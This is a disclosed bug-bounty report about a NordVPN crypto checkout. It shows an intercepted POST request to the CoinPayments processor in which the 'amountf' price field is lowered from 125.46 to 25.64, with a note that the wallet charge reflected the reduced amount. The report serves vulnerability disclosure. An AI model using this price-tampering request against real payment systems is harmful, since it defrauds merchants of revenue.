# Reduced Payment amount while paying on Crypto Currencies

## Report Details
- **Report ID**: 803876
- **URL**: https://hackerone.com/reports/803876
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-02-24T18:56:32.706Z
- **Disclosed**: 2020-03-03T16:37:43.174Z

## Reporter
- **Username**: archerl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nordsecurity

## Vulnerability Information
## Summary:
While the payment is made via Crypto Currencies on the site "https://join.nordvpn.com/order/", the amount can be reduced to 25.64 instead of the original amount, this can cause loss of revenue to the company.  
Even the BTC value reflects the reduced converted values, see the screenshot.
## Steps To Reproduce:
1. GO to the website https://join.nordvpn.com/order/, check the crypto payment and select the crypto payment.
2. Intercept the request

----start request----
POST /index.php HTTP/1.1
Host: www.coinpayments.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://join.nordvpn.com/order/
Content-Type: application/x-www-form-urlencoded
Content-Length: 355
DNT: 1
Connection: close
Cookie: CPTC=f9cc9e3fa4d739bc7fc14299ce93ad6d; PHPSESSID=rctrgm3vd8cil352n2s4l0p8g4
Upgrade-Insecure-Requests: 1

cmd=_pay&reset=1&email=asd%40gmail.com&merchant=e64a9629f9a68cdeab5d0edd21b068d3&currency=USD&amountf=25.64&item_name=VPN+order&invoice=56612347&success_url=https%3A%2F%2Fjoin.nordvpn.com%2Fpayments%2Fcallback%2F6f921cd6b73c9aa7e999d0da97ad1b04&cancel_url=https%3A%2F%2Fjoin.nordvpn.com%2Forder%2Ferror%2F%3Ferror_alert%3Dpayment%26eu%3D1&want_shipping=0

-------------end request-------------------

The value of the *amountf* is changed to 25.64 instead of the original value of 125.46.

The screenshots attached can show that the walet reflects the same, as in converted with respect to $25.64 and not 125.46.

## Supporting Material/References:

## Impact

Financial loss to the company.

## Attachments
No attachments
